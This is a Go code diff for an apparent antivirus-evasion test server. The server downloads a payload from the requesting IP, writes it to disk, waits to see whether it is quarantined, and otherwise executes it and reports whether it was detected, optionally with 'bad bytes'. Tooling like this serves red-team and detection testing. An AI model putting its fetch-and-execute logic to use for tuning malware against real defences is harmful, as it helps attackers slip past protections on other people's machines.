@@ -7,10 +7,10 @@ import (
 	"strings"
 	"io/ioutil"
 	"os"
-	"path/filepath"
 	"time"
 	"sync"
 	"flag"
+	"os/exec"
 )
 
 type Response struct {
@@ -49,10 +49,7 @@ func Exists(path string) bool {
 }
 
 // Funtion that che
-func Quarantined(contents []byte) (string, bool) {
-	// Write the payload to a file
-	path := WritePayload(contents)
-
+func Quarantined(path string) bool {
 	// Sleep for 3 seconds
 	time.Sleep(3 * time.Second)
 
@@ -61,16 +58,16 @@ func Quarantined(contents []byte) (string, bool) {
 		// Check if the file is quarantined
 		file, err := os.Open(path)
 		if err != nil {
-			return path, true
+			return true
 		}
 		defer file.Close()
-		return path, false
+		return false
 	}
-	return path, true
+	return true
 }
 
 // Function to get payload content from a download link
-func getPayload(ip string) []byte {
+func GetPayload(ip string) []byte {
 	// Create a new HTTP request
 	req, err := http.NewRequest("GET", "http://"+ip+":8080/api/v1/payload/download", nil)
 	if err != nil {
@@ -88,6 +85,8 @@ func getPayload(ip string) []byte {
 	resp, err := client.Do(req)
 	if err != nil {
 		fmt.Println(err)
+		// Exit the function
+		return []byte{}
 	}
 
 	// Read the response body
@@ -101,7 +100,7 @@ func getPayload(ip string) []byte {
 }
 
 // Function to scan for bad bytes
-func scanBadBytes(payload []byte) string {
+func ScanBadBytes(payload []byte) string {
 	// Create a new bad bytes string
 	badBytes := ""
 
@@ -110,19 +109,26 @@ func scanBadBytes(payload []byte) string {
 }
 
 // Function to run the payload on disk
-func runPayload(payload []byte, path string) {
+func RunPayload(payload []byte, path string) {
 	// Write the payload to a file
 	filePath := WritePayload(payload)
 
-	// Run the with fork and run
+	// Execute the payload
+	cmd := exec.Command(filePath)
+	cmd.Run()
+}
 	
 
-func (p *Payload) Scan(ip string, getBadBytes *bool) Response {
+func Scan(ip string, getBadBytes *bool, p *Payload) Response {
 	// Create a new response
 	result := Response{BadBytes: "", Result: "Undetected"}
 
 	// Get the payload content
-	payload := getPayload(ip)
+	payload := GetPayload(ip)
+	if len(payload) == 0 {
+		result.Result = "Error"
+		return result
+	}
 
 	// Lock the payload
 	p.Lock()
@@ -130,38 +136,54 @@ func (p *Payload) Scan(ip string, getBadBytes *bool) Response {
 
 	// Set the payload content
 	p.Payload = payload
+	
+	// Write the payload to a file
+	path := WritePayload(payload)
 
 	// Check if the payload is quarantined
-	if path, quarantined := Quarantined(payload); quarantined {
+	if Quarantined(path) {
 		result.Result = "Detected"
+
 		// If the bad bytes are requested scan for them
 		if *getBadBytes {
-			result.BadBytes = scanBadBytes(payload)
+			result.BadBytes = ScanBadBytes(payload)
 		}
 
 		// Return the result
 		return result
 	} else {
-		// Check for dynamic 
-		runPayload(payload, path)
+		// Run the payload
+		RunPayload(payload, path)
+
+		// Check if the payload is quarantined
+		if Quarantined(path) {
+			result.Result = "Detected"
+		}
 	}
+
+	return result
 }
 
-func reqHandler(w http.ResponseWriter, r *http.Request, getBadBytes *bool) {
-	// Extract the IP address from the request without the port number
-	ip := strings.Split(string(r.RemoteAddr), ":")[0]
+func reqHandler(getBadBytes *bool, p *Payload) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		// Extract the IP address from the request without the port number
+		ip := strings.Split(r.RemoteAddr, ":")[0]
 
-	// Scan the payload
-	result := scan(ip, getBadBytes)
+		// Scan the payload
+		result := Scan(ip, getBadBytes, p)
 
-	// Send the response
-	json.NewEncoder(w).Encode(result)
+		// Send the response
+		json.NewEncoder(w).Encode(result)
+	}
 }
 
 func main() {
 	getBadBytes := flag.Bool("getBadBytes", false, "Get the bad bytes")
 	flag.Parse()
 
-	http.HandleFunc("/", reqHandler)
+	// Create a new payload
+	p := Payload{Payload: []byte{}, Scanning: false}
+
+	http.HandleFunc("/", reqHandler(getBadBytes, &p))
 	http.ListenAndServe(":9090", nil)
 }
